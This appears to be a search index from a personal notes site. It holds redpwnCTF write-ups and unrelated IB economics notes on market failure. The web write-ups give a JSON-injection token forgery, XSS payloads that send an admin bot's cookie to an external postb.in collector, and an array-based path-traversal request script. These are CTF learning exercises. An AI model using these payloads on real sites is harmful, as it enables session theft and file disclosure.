triger check to return true . I hate my data structures class! Why can't I just sort by hand? 1 2 1 7 6 5 4 3 4 8 7 6 5 8 7 6 8 7 8 10 Well done! flag{4ft3r_y0u_put_u54c0_0n_y0ur_c011ege_4pp5_y0u_5t1ll_h4ve_t0_d0_th15_57uff}","title":"bubbly"},{"location":"CTF%20Writeups/redpwnCTF%202021/Reverse%20Engineering/bubbly/#bubbly","text":"By running file on the binary, we see something very interesting. bubbly: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=edb56d2d9355bcee01909f171d8a272a3e82d053, with debug_info, not stripped This binary is not strippe and also contains debug_info which makes it pretty easy to reverse.","title":"bubbly"},{"location":"CTF%20Writeups/redpwnCTF%202021/Reverse%20Engineering/bubbly/#decompiler","text":"By putting the binary in ghydra and analyzing the code, we get a sence of what the functinos do. There are 2 main functions we care about main and check . I converted the functions and arguments into python code and here's the logic behind the binary p = False import operator def check (): i = 0 while ( True ): if ( 8 < i ): return True if ( nums [ i + 1 ] < nums [ i ]): break i += 1 return False while ( True ): n = int ( input ()) if ( n > 8 ): break nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) nums [ n + 1 ] = operator . xor ( nums [ n + 1 ], nums [ n ]) nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) print ( nums ) p = check () if ( p ): print ( \"got it\" ) else : print ( \"nope\" ) These are some lines that we do care about. This is the condition where check() doesn't break and when i increments over 8 returns true. if ( nums [ i + 1 ] < nums [ i ]): By doing some experiments, we know that this is just changin the order of nums[n] and nums[n+1] by running XOR 3 times. nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) nums [ n + 1 ] = operator . xor ( nums [ n + 1 ], nums [ n ]) nums [ n ] = operator . xor ( nums [ n ], nums [ n + 1 ]) So if we want check to return true, we need to make every element in nums greater than the previous element in nums . Basically in incremental order.","title":"Decompiler"},{"location":"CTF%20Writeups/redpwnCTF%202021/Reverse%20Engineering/bubbly/#nums","text":"We need to set nums, but what is nums? Well it's just a variable stored in memory, since we have full access to the memory of the binary, we could use gdb and find out the values of nums > x/24wx nums 0x4060 <nums>: 0x00000001 0x0000000a 0x00000003 0x00000002 0x4070 <nums+16>:0x00000005 0x00000009 0x00000008 0x00000007 0x4080 <nums+32>:0x00000004 0x00000006 Cannot access memory at address 0x4088 So we can see that there are 10 elements in nums and we could convert the hex to decimal by hand since they are pretty small. Here's what I got. nums = [ 1 , 10 , 3 , 2 , 5 , 9 , 8 , 7 , 4 , 6 ] What we need to do now is find a series of indexes and swap the element at i and i+1 and ultimately sort the array.","title":"nums"},{"location":"CTF%20Writeups/redpwnCTF%202021/Reverse%20Engineering/bubbly/#the-exploit","text":"By keeping track of the array on a piece of paper, I was able to find the set of moves to sort nums and triger check to return true . I hate my data structures class! Why can't I just sort by hand? 1 2 1 7 6 5 4 3 4 8 7 6 5 8 7 6 8 7 8 10 Well done! flag{4ft3r_y0u_put_u54c0_0n_y0ur_c011ege_4pp5_y0u_5t1ll_h4ve_t0_d0_th15_57uff}","title":"The Exploit"},{"location":"CTF%20Writeups/redpwnCTF%202021/Reverse%20Engineering/ropes/","text":"ropes \u00b6 Running file on ropes we get Mach-O 64-bit x86_64 executable ``` And currently, there is no `Mach-O` loader on linux and I don't want to pull out my Mac. So I just ran `strings` on the binary and I found the flag. # strings Strings in in the shell prints out all the readable bytes in a file. ```bash strings ropes __PAGEZERO __TEXT __text __TEXT __stubs __TEXT __stub_helper __TEXT __cstring __TEXT __unwind_info __TEXT __DATA __nl_symbol_ptr __DATA __la_symbol_ptr __DATA __LINKEDIT /usr/lib/dyld /usr/lib/libSystem.B.dylib Give me a magic number: First part is: flag{r0pes_ar3_ Second part is: just_l0ng_str1ngs} @dyld_stub_binder @_printf @_puts @_scanf _mh_execute_header !main __mh_execute_header _main _printf _puts _scanf dyld_stub_binder There you see it the parts of the flag.","title":"ropes"},{"location":"CTF%20Writeups/redpwnCTF%202021/Reverse%20Engineering/ropes/#ropes","text":"Running file on ropes we get Mach-O 64-bit x86_64 executable ``` And currently, there is no `Mach-O` loader on linux and I don't want to pull out my Mac. So I just ran `strings` on the binary and I found the flag. # strings Strings in in the shell prints out all the readable bytes in a file. ```bash strings ropes __PAGEZERO __TEXT __text __TEXT __stubs __TEXT __stub_helper __TEXT __cstring __TEXT __unwind_info __TEXT __DATA __nl_symbol_ptr __DATA __la_symbol_ptr __DATA __LINKEDIT /usr/lib/dyld /usr/lib/libSystem.B.dylib Give me a magic number: First part is: flag{r0pes_ar3_ Second part is: just_l0ng_str1ngs} @dyld_stub_binder @_printf @_puts @_scanf _mh_execute_header !main __mh_execute_header _main _printf _puts _scanf dyld_stub_binder There you see it the parts of the flag.","title":"ropes"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/panda/","text":"panda facts \u00b6 We were given a nodejs backend to work with and our goal is to make the token's member field to true so that we could access the flag. Source Code \u00b6 We really just need to focus on the token generation function since that where we want to exploit. async function generateToken ( username ) { const algorithm = 'aes-192-cbc' ; const key = Buffer . from ( process . env . KEY , 'hex' ); // Predictable IV doesn't matter here const iv = Buffer . alloc ( 16 , 0 ); const cipher = crypto . createCipheriv ( algorithm , key , iv ); const token = `{\"integrity\":\" ${ INTEGRITY } \",\"member\":0,\"username\":\" ${ username } \"}` let encrypted = '' ; encrypted += cipher . update ( token , 'utf8' , 'base64' ); encrypted += cipher . final ( 'base64' ); return encrypted ; } You can see the token is made by a js object and encoded. Without any sanitation on the input, we could easily run something on the ${username} so that we alter the results. Alter ${username} \u00b6 What we could do here is escape the username key and creat a new key in the object. The decrypt function will render out a token that has 2 member keys and the latter one counts. const token = `{\"integrity\":\" ${ INTEGRITY } \",\"member\":0,\"username\":\" random\",\"member\":\"1 \"}` See what I did here? I escape the username filed with \" and created a new member key. So our input to the webpage should be random\",\"member\":\"1 The flag \u00b6 Sure enough, if I enter the payload, the webpage says hello random instead of the full username since we escaped the username field. When I click on the member only part, we get the flag flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}","title":"panda facts"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/panda/#panda-facts","text":"We were given a nodejs backend to work with and our goal is to make the token's member field to true so that we could access the flag.","title":"panda facts"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/panda/#source-code","text":"We really just need to focus on the token generation function since that where we want to exploit. async function generateToken ( username ) { const algorithm = 'aes-192-cbc' ; const key = Buffer . from ( process . env . KEY , 'hex' ); // Predictable IV doesn't matter here const iv = Buffer . alloc ( 16 , 0 ); const cipher = crypto . createCipheriv ( algorithm , key , iv ); const token = `{\"integrity\":\" ${ INTEGRITY } \",\"member\":0,\"username\":\" ${ username } \"}` let encrypted = '' ; encrypted += cipher . update ( token , 'utf8' , 'base64' ); encrypted += cipher . final ( 'base64' ); return encrypted ; } You can see the token is made by a js object and encoded. Without any sanitation on the input, we could easily run something on the ${username} so that we alter the results.","title":"Source Code"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/panda/#alter-username","text":"What we could do here is escape the username key and creat a new key in the object. The decrypt function will render out a token that has 2 member keys and the latter one counts. const token = `{\"integrity\":\" ${ INTEGRITY } \",\"member\":0,\"username\":\" random\",\"member\":\"1 \"}` See what I did here? I escape the username filed with \" and created a new member key. So our input to the webpage should be random\",\"member\":\"1","title":"Alter ${username}"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/panda/#the-flag","text":"Sure enough, if I enter the payload, the webpage says hello random instead of the full username since we escaped the username field. When I click on the member only part, we get the flag flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}","title":"The flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-pastebin/","text":"static-pastebin \u00b6 This is a typical XSS challenge where we want the bot to visit our pastebin and execute js to get the cookie. Filters and Network \u00b6 I tried to input some strings in the pastebin and monitored the network activity. There is no POST request and when I check the url it had a base 64 string as an argument. This means that all the websites does is encode the string we input then decode it when we need to display it. So I tried the basic form of XSS < script > alert ( 'xss' )</ script > And it didn't show up. So I check the network again and saw a js file that has a filter on the input function clean ( input ) { let brackets = 0 ; let result = '' ; for ( let i = 0 ; i < input . length ; i ++ ) { const current = input . charAt ( i ); if ( current == '<' ) { brackets ++ ; } if ( brackets == 0 ) { result += current ; } if ( current == '>' ) { brackets -- ; } } return result } Here's the clean() function. It basically counts the amount of < and > and determin whether to display the text. Bypassing the filter \u00b6 We can simply bypass the filter by setting the value of brackets to -1 before we enter our script tags so that everything between the script tags get's displayed. > < script > alert ( 'xss' )</ script > Now we see that the script tags work but the alert() doesn't show up due to the value of brackets . Alternate form of XSS \u00b6 There are many forms of XSS, including ones that have the script within the angle brackets, for example this one: > < img src = x onerror = \"javascript:alert('xss')\" > And surely it worked, now we need to grab the cookie of the admin bot. post bin \u00b6 Post Bin is a tool that could collect all requests to a certain url and we can grab the document.cookie js variable by adding it as an argument. Heres the final payload > < img src = x onerror = \"javascript:window.location.assign(`https://postb.in/1593716639876-9019670642446?cookie=${document.cookie}`)\" > Flag \u00b6 I bas64 encoded the string then appended it to the url then fed it to the bot. And surely, on my post bin page, I got a request that contains the document cookie which is the flag https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj0iamF2YXNjcmlwdDp3aW5kb3cubG9jYXRpb24uYXNzaWduKGBodHRwczovL3Bvc3RiLmluLzE1OTM3MTY2Mzk4NzYtOTAxOTY3MDY0MjQ0Nj9jb29raWU9JHtkb2N1bWVudC5jb29raWV9YCkiPg== flag=flag{54n1t1z4t10n_k1nd4_h4rd}","title":"static-pastebin"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-pastebin/#static-pastebin","text":"This is a typical XSS challenge where we want the bot to visit our pastebin and execute js to get the cookie.","title":"static-pastebin"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-pastebin/#filters-and-network","text":"I tried to input some strings in the pastebin and monitored the network activity. There is no POST request and when I check the url it had a base 64 string as an argument. This means that all the websites does is encode the string we input then decode it when we need to display it. So I tried the basic form of XSS < script > alert ( 'xss' )</ script > And it didn't show up. So I check the network again and saw a js file that has a filter on the input function clean ( input ) { let brackets = 0 ; let result = '' ; for ( let i = 0 ; i < input . length ; i ++ ) { const current = input . charAt ( i ); if ( current == '<' ) { brackets ++ ; } if ( brackets == 0 ) { result += current ; } if ( current == '>' ) { brackets -- ; } } return result } Here's the clean() function. It basically counts the amount of < and > and determin whether to display the text.","title":"Filters and Network"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-pastebin/#bypassing-the-filter","text":"We can simply bypass the filter by setting the value of brackets to -1 before we enter our script tags so that everything between the script tags get's displayed. > < script > alert ( 'xss' )</ script > Now we see that the script tags work but the alert() doesn't show up due to the value of brackets .","title":"Bypassing the filter"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-pastebin/#alternate-form-of-xss","text":"There are many forms of XSS, including ones that have the script within the angle brackets, for example this one: > < img src = x onerror = \"javascript:alert('xss')\" > And surely it worked, now we need to grab the cookie of the admin bot.","title":"Alternate form of XSS"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-pastebin/#post-bin","text":"Post Bin is a tool that could collect all requests to a certain url and we can grab the document.cookie js variable by adding it as an argument. Heres the final payload > < img src = x onerror = \"javascript:window.location.assign(`https://postb.in/1593716639876-9019670642446?cookie=${document.cookie}`)\" >","title":"post bin"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-pastebin/#flag","text":"I bas64 encoded the string then appended it to the url then fed it to the bot. And surely, on my post bin page, I got a request that contains the document cookie which is the flag https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj0iamF2YXNjcmlwdDp3aW5kb3cubG9jYXRpb24uYXNzaWduKGBodHRwczovL3Bvc3RiLmluLzE1OTM3MTY2Mzk4NzYtOTAxOTY3MDY0MjQ0Nj9jb29raWU9JHtkb2N1bWVudC5jb29raWV9YCkiPg== flag=flag{54n1t1z4t10n_k1nd4_h4rd}","title":"Flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-static-hosting/","text":"static-static-hosting \u00b6 This is another XSS challenge where we tackel with another filter the filter \u00b6 Under the network activities, we can find the filter. function clean ( input ) { const template = document . createElement ( 'template' ); const html = document . createElement ( 'html' ); template . content . appendChild ( html ); html . innerHTML = input ; sanitize ( html ); const result = html . innerHTML ; return result ; } function sanitize ( element ) { const attributes = element . getAttributeNames (); for ( let i = 0 ; i < attributes . length ; i ++ ) { // Let people add images and styles if ( ! [ 'src' , 'width' , 'height' , 'alt' , 'class' ]. includes ( attributes [ i ])) { element . removeAttribute ( attributes [ i ]); } } const children = element . children ; for ( let i = 0 ; i < children . length ; i ++ ) { if ( children [ i ]. nodeName === 'SCRIPT' ) { element . removeChild ( children [ i ]); i -- ; } else { sanitize ( children [ i ]); } } } Basically, this means that we could only use ['src', 'width', 'height', 'alt', 'class'] as our attributes in tags. This still gives us a lot of room to work with. Embed and Iframe \u00b6 I thought about the <embed> and <iframe> tags as their src attribut could triger javascript. However, when I tried, <embed> worked for me on my local computer but not the bot as I am running firefox and the bot is running chrome. But <iframe> wored for both. iframe \u00b6 < iframe src = \"javascript:alert(1)\" ></ iframe > And it worked! So the next step is to do the post-bin move and grab the document.cookie Payload \u00b6 I encoded my payload into base64 and fed it to the bot. Moments later, I got the flag. < iframe src = \"javascript:window.location.assign(`https://postb.in/1593716639876-9019670642446?cookie=${document.cookie}`)\" ></ iframe > https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6d2luZG93LmxvY2F0aW9uLmFzc2lnbihgaHR0cHM6Ly9wb3N0Yi5pbi8xNTkzNzE2NjM5ODc2LTkwMTk2NzA2NDI0NDY/Y29va2llPSR7ZG9jdW1lbnQuY29va2llfWApIj48L2lmcmFtZT4= flag{wh0_n33d5_d0mpur1fy}","title":"static-static-hosting"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-static-hosting/#static-static-hosting","text":"This is another XSS challenge where we tackel with another filter","title":"static-static-hosting"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-static-hosting/#the-filter","text":"Under the network activities, we can find the filter. function clean ( input ) { const template = document . createElement ( 'template' ); const html = document . createElement ( 'html' ); template . content . appendChild ( html ); html . innerHTML = input ; sanitize ( html ); const result = html . innerHTML ; return result ; } function sanitize ( element ) { const attributes = element . getAttributeNames (); for ( let i = 0 ; i < attributes . length ; i ++ ) { // Let people add images and styles if ( ! [ 'src' , 'width' , 'height' , 'alt' , 'class' ]. includes ( attributes [ i ])) { element . removeAttribute ( attributes [ i ]); } } const children = element . children ; for ( let i = 0 ; i < children . length ; i ++ ) { if ( children [ i ]. nodeName === 'SCRIPT' ) { element . removeChild ( children [ i ]); i -- ; } else { sanitize ( children [ i ]); } } } Basically, this means that we could only use ['src', 'width', 'height', 'alt', 'class'] as our attributes in tags. This still gives us a lot of room to work with.","title":"the filter"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-static-hosting/#embed-and-iframe","text":"I thought about the <embed> and <iframe> tags as their src attribut could triger javascript. However, when I tried, <embed> worked for me on my local computer but not the bot as I am running firefox and the bot is running chrome. But <iframe> wored for both.","title":"Embed and Iframe"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-static-hosting/#iframe","text":"< iframe src = \"javascript:alert(1)\" ></ iframe > And it worked! So the next step is to do the post-bin move and grab the document.cookie","title":"iframe"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/static-static-hosting/#payload","text":"I encoded my payload into base64 and fed it to the bot. Moments later, I got the flag. < iframe src = \"javascript:window.location.assign(`https://postb.in/1593716639876-9019670642446?cookie=${document.cookie}`)\" ></ iframe > https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6d2luZG93LmxvY2F0aW9uLmFzc2lnbihgaHR0cHM6Ly9wb3N0Yi5pbi8xNTkzNzE2NjM5ODc2LTkwMTk2NzA2NDI0NDY/Y29va2llPSR7ZG9jdW1lbnQuY29va2llfWApIj48L2lmcmFtZT4= flag{wh0_n33d5_d0mpur1fy}","title":"Payload"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/","text":"tux-fanpage \u00b6 I knew this was a path traversal challenge from the url immediatly when I saw it. It's typical form of page?path=index.html tiped it. We were also given the backend since there are some filters ther to prevent path traversal. Source code \u00b6 app . get ( '/page' , ( req , res ) => { let path = req . query . path //Handle queryless request if ( ! path || ! strip ( path )){ res . redirect ( '/page?path=index.html' ) return } path = strip ( path ) path = preventTraversal ( path ) res . sendFile ( prepare ( path ), ( err ) => { if ( err ){ if ( ! res . headersSent ) { try { res . send ( strip ( req . query . path ) + ' not found' ) } catch { res . end () } } } }) }) This is where we take in the input and renders out the page. But before sendFile() is called, the string must go through strip , preventTraversal and prepare preventTraversal \u00b6 Here it checks if dir contains any ../ or ..\\\\ it removes it if it exists. //Prevent directory traversal attack function preventTraversal ( dir ){ if ( dir . includes ( '../' )){ let res = dir . replace ( '../' , '' ) return preventTraversal ( res ) } //In case people want to test locally on windows if ( dir . includes ( '..\\\\' )){ let res = dir . replace ( '..\\\\' , '' ) return preventTraversal ( res ) } return dir } prepare \u00b6 This function will create an absolute path using ./public/ and dir by concatenating them. //Get absolute path from relative path function prepare ( dir ){ return path . resolve ( './public/' + dir ) } strip \u00b6 Strip will get rid of all leading non-alphanumeric elements. //Strip leading characters function strip ( dir ){ const regex = /^[a-z0-9]$/im //Remove first character if not alphanumeric if ( ! regex . test ( dir [ 0 ])){ if ( dir . length > 0 ){ return strip ( dir . slice ( 1 )) } return '' } return dir } My attempts \u00b6 First, I thought tha I could bypass the filters with wired encodings, but that wouldn't work here since it will need some sort of special character to work and strip takes care of it. Then I tried to do stuff within in the assets folder where all the images and resources are stored. No luck. Then I say something that hinted me inputs \u00b6 When I was closely checking the strip function, I saw something interesting: dir [ 0 ] This seemingly checks the first character of a string, but that's only the case if we input a string. What if we send in an array? Well in that case, strip will only check the first element instead of the first character. arrays \u00b6 Then I experimented with arrays by running commands in the nodejs console. And I found out that we could bypass the filters. For preventTraversal if we pass in an arrya to inclues() we check each element, instead of all characers. In this case if our paylaod is not pure ../ we could by pass it. For prepare I experimented with concatenation between string and arrays and found that it will just render the array elements with ',' . Payload \u00b6 Consider this payloadY: [ '1' , '/' , '/../../../index.js' ] The '1' solves the strip filter, then by manipulating and testing the concatenation, we get ./public/+['1','/','/../../../index.js'] = ./public/1,/../../../index.js which is perfect for us. But how do we input an array? input arrays \u00b6 We could use the python requests library or we could do it by hand. Heres my python script and the printed out url. import requests payload = { 'path' : [ '1' , '/' , '/../../../index.js' ]} r = requests . get ( 'https://tux-fanpage.2020.redpwnc.tf/page' , params = payload ) print ( r . url ) print ( r . text ) The url: https://tux-fanpage.2020.redpwnc.tf/page?path=1&path=%2F&path=%2F..%2F..%2F..%2Findex.js Flag \u00b6 const flag = 'flag{tr4v3rsal_Tim3}'","title":"tux-fanpage"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#tux-fanpage","text":"I knew this was a path traversal challenge from the url immediatly when I saw it. It's typical form of page?path=index.html tiped it. We were also given the backend since there are some filters ther to prevent path traversal.","title":"tux-fanpage"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#source-code","text":"app . get ( '/page' , ( req , res ) => { let path = req . query . path //Handle queryless request if ( ! path || ! strip ( path )){ res . redirect ( '/page?path=index.html' ) return } path = strip ( path ) path = preventTraversal ( path ) res . sendFile ( prepare ( path ), ( err ) => { if ( err ){ if ( ! res . headersSent ) { try { res . send ( strip ( req . query . path ) + ' not found' ) } catch { res . end () } } } }) }) This is where we take in the input and renders out the page. But before sendFile() is called, the string must go through strip , preventTraversal and prepare","title":"Source code"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#preventtraversal","text":"Here it checks if dir contains any ../ or ..\\\\ it removes it if it exists. //Prevent directory traversal attack function preventTraversal ( dir ){ if ( dir . includes ( '../' )){ let res = dir . replace ( '../' , '' ) return preventTraversal ( res ) } //In case people want to test locally on windows if ( dir . includes ( '..\\\\' )){ let res = dir . replace ( '..\\\\' , '' ) return preventTraversal ( res ) } return dir }","title":"preventTraversal"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#prepare","text":"This function will create an absolute path using ./public/ and dir by concatenating them. //Get absolute path from relative path function prepare ( dir ){ return path . resolve ( './public/' + dir ) }","title":"prepare"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#strip","text":"Strip will get rid of all leading non-alphanumeric elements. //Strip leading characters function strip ( dir ){ const regex = /^[a-z0-9]$/im //Remove first character if not alphanumeric if ( ! regex . test ( dir [ 0 ])){ if ( dir . length > 0 ){ return strip ( dir . slice ( 1 )) } return '' } return dir }","title":"strip"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#my-attempts","text":"First, I thought tha I could bypass the filters with wired encodings, but that wouldn't work here since it will need some sort of special character to work and strip takes care of it. Then I tried to do stuff within in the assets folder where all the images and resources are stored. No luck. Then I say something that hinted me","title":"My attempts"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#inputs","text":"When I was closely checking the strip function, I saw something interesting: dir [ 0 ] This seemingly checks the first character of a string, but that's only the case if we input a string. What if we send in an array? Well in that case, strip will only check the first element instead of the first character.","title":"inputs"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#arrays","text":"Then I experimented with arrays by running commands in the nodejs console. And I found out that we could bypass the filters. For preventTraversal if we pass in an arrya to inclues() we check each element, instead of all characers. In this case if our paylaod is not pure ../ we could by pass it. For prepare I experimented with concatenation between string and arrays and found that it will just render the array elements with ',' .","title":"arrays"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#payload","text":"Consider this payloadY: [ '1' , '/' , '/../../../index.js' ] The '1' solves the strip filter, then by manipulating and testing the concatenation, we get ./public/+['1','/','/../../../index.js'] = ./public/1,/../../../index.js which is perfect for us. But how do we input an array?","title":"Payload"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#input-arrays","text":"We could use the python requests library or we could do it by hand. Heres my python script and the printed out url. import requests payload = { 'path' : [ '1' , '/' , '/../../../index.js' ]} r = requests . get ( 'https://tux-fanpage.2020.redpwnc.tf/page' , params = payload ) print ( r . url ) print ( r . text ) The url: https://tux-fanpage.2020.redpwnc.tf/page?path=1&path=%2F&path=%2F..%2F..%2F..%2Findex.js","title":"input arrays"},{"location":"CTF%20Writeups/redpwnCTF%202021/Web%20Exploitation/tux-fanpage/#flag","text":"const flag = 'flag{tr4v3rsal_Tim3}'","title":"Flag"},{"location":"IB/HL%20Economics/market_failure/","text":"Market Failure \u00b6 Notes, Key Points, Paper 2 Tips & Sample Questions Summarized Notes \u00b6 Taxes & Subsidies \u00b6 Taxes \u00b6 Governments impose indirect tax to create government revenue, discourage consumption of certain demerit goods, to redistribute income and a method of improving the allocation of resources. When a specific tax is imposed, consumers pay more and consume less. Producers receive less revenue and sell less products/services. The government receives tax revenue and workers receive lower wages due to reduced total producer revenue. Society as a whole loses allocating efficiency. However, it can be compensated. Subsidies \u00b6 Governments provide subsidies for three main reasons: Lower price of an essential good, guarantee supplies that are necessary and enable producers to compete with overseas trade. When evaluating a subsidy, the opportunity cost from providing other firms subsidies, damage done to foreign producers, players paying taxes and the efficiency/decreased incentive created. Price Controls \u00b6 Price Ceilings \u00b6 Governments impose price ceilings to help consumers obtain necessity and merit goods at a cheaper price. There can be consequences caused by price ceilings aside from a shortage in the market. Price ceilings can create an underground market, create queues for producers and cause unfairness in distribution of limited goods. When a price ceiling is imposed, consumers partly gain and partly lose where some consumers gain extra surplus by purchasing the product at a lower price. However, the shortage caused other consumers to have no access at all to the product or service and remain unsatisfied. Society experiences a loss in allocating efficiency (deadweight loss). Workers might get fired due to a reduction of quantity supplied and loss in total producer revenue. Governments do not gain nor lose economically but can gain political popularity amongst consumers who benefitted. To eliminate or reduce the shortage caused by a price ceiling governments can: find ways to reduce demand for a product but this limits the consumption of a product, find ways to increase the supply of the product through subsidies and direct provision. Price Floors \u00b6 Price floors are imposed to raise income for producers of goods and services that the government thinks are important and to protect workers by setting a minimum wage that ensures they can live a reasonable life. Some examples of price floors are minimum wages for workers, minimum prices for agricultural goods and minimum prices for alcohol. Price floors will create inefficiency due to a surplus. Governments can use the following four ways to address the surplus: buying up the surplus (store, destroy or sell to other countries), increasing demand through advertising, restricting overseas imports or imposing a producer quota. A minimum wage is a type of price floor, the minimum price for a market of a factor of production: labour. A minimum wage can increase income for low-paid workers, increase labour productivity, offset employer power-imbalance and increase incentive for people to enter the labour market. However, a minimum wage can cause unemployment in competitive markets, encourage the creation of informal/illegal labour markets, destruction of small businesses and higher prices for firms to pass on to consumers. Negative & Positive Externalities \u00b6 When society doesn't take into account externalities, it leads to market failure. Negative Externalities \u00b6 Negative externalities of production is a cost that is suffered by a third party as a result of production of a good or service. An example would be the production of steel where toxic chemicals are produced for society. When negative externalities of production are not recognized, an overproduction of that good or service will cause allocating inefficiency or welfare loss. There will be two optimums: the market equilibrium and the social equilibrium where it's the social optimum. In this situation, no party can benefit more without harming another by changing its production/consumption. Solutions to negative production externalities are government regulation for producers, indirect taxations or a market for the externality. Tradable permits can be issued to firms to create a market for pollution. This creates a quota for each firm on their pollution and incentives firms to pollute less since permits can be sold for money. Negative externalities of consumption happen on the consumer side where consumers harm others by consuming more of a product or service, such as smoking. An overconsumption will happen and cause deadweight loss which leads to allocative inefficiency. In the case of demerit goods, they are overproduced by the market and over-consumed by consumers because they often have unrecognized negative externalities of consumption and people just don't care about the harmful effects upon themselves and others. To combat negative consumption externalities, governments can create legislation banning or reducing consumption, imposing taxes for certain demerit goods, provide education/advertisement to society or use consumer nudges to make consumers voluntarily reduce consumption. Positive Externalities \u00b6 Positive externalities is when the side-effect on a third party that's not a producer or a consumer that pays to consume a product or service is beneficial. When a firm produces a good or service and there is a positive benefit to third parties such as society a positive externality of production is present. This often leads to a situation where the cost to the private individuals is higher than the cost to society and creates an underproduction of said product or service which leads to deadweight loss or potential welfare gain. To combat positive externalities of production, governments can directly provide the good or service through direct provision or provide subsidies to firms. Positive externalities of consumption are benefits to third parties when a good or service is consumed. This leads to a situation where the benefit to society is greater than the benefit to the private consumer thus an under-consumption often happens. This also causes deadweight loss or potential welfare gain. In the case of merit goods, they are often services that benefit society as a whole more than the consumer such as education, healthcare, sport facilities etc. They are often under consumed because of a lack of recognition, low levels of income and poverty and blatant consumer ignorance. To combat positive externalities of consumption, governments can create legislation to consume more, positive advertising, direct government provision for certain products or services or subsidies. Common Pool Resources & Public Goods \u00b6 Common Pool Resources \u00b6 Common pool resources are non-excludable and rival and that's why the main consequence in the absence of government intervention is resource degradation. Common pool resources are very susceptible to negative externalities (both production and consumption) because they are non-excludable so overconsumption/overproduction will occur. The tragedy of the commons refers to the consequences of non-excludability of common resources. When a party simply \"losses\" in self-interest if one does not consume more of a common pool resource which causes exhaustion of limited resources. The free rider problem is when parties consider society as a whole and do not act upon self-interest, other \"free riders\" will simply consume/produce more of the common pool resources with no consequences. To combat the tragedy of the commons International agreements, tradable permits, carbon taxes, legislation/regulations, subsidies and collective self governance are often used. Public Goods \u00b6 Public goods often cause market failure because there is no profit incentive and usually can't be provided by any market. Some examples are street lights, breathable air, lighthouses and national defense. Public goods have two key characteristics of being non-excludable and non-rival. One cannot reasonably stop another from using the resource and when one person uses the good, others can still use the good. To combat the issue of public goods, governments often resort to direct provision or heavy subsidies or work in partnership with firms in the private sector. Asymmetric Information \u00b6 Asymmetric information refers to a situation when one party to an economic transaction possesses greater material knowledge than the other party. Asymmetric information often causes market failure due to two reasons: Uncertainty of the buyer will drive prices down across the whole market. This will further cause the market to collapse and no trade will occur at any price point. Due to asymmetric information, when consumers know more than the producers, there will be a selection of who to provide a good/service to, or there will be a price raise since consumers who need the good/service to will use it more (ie. less healthy people and health insurance) An example of adverse selection would be insurance companies choosing who to sell their product to or creating unreasonable prices for people who the company thinks is not safe to sell the product in an attempt to scare them away from purchasing. The most important way to combat asymmetric information is signalling. For example sellers are required to tell buyers the condition of each car, life insurance companies require customers to do health checkups before selling them products etc. Moral hazards are situations where one person is trying to get another person to behave in a certain way but if the first person cannot observe the second person's work and the second person needs to put effort into said work, the second person can simply avoid work. Both moral hazards and adverse selection can cause market failure. In the case of adverse selection, the market failure occurs before an economic transaction has been made. One party has more information than the other, and this gives the party an advantage going into the transaction. In the case of moral hazard, the market failure occurs after the economic transaction has been made. The party with greater knowledge of the risk has the advantage following the transaction. Definitions List \u00b6 Indirect Tax Tax imposed on spending to buy goods and services. Paid by the producer (firms) but are partially passed to the consumer. Excise Taxes Tax on a specific good and services Specific Taxes A type of excise tax of a fixed dollar amount Ad Valorem Taxes A type of excise tax of a fixed percentage amount General Taxes Taxes on all (or most) goods and services Subsidy An amount of money paid by the government to a firm, per unit output, to increase output and lower price. Price Controls A minimum or maximum price set by the government such that prices are unable to adjust to equilibrium level Price Ceilings A maximum price for a good or service set by the government Price Floors A minimum price for a good or service set by the government 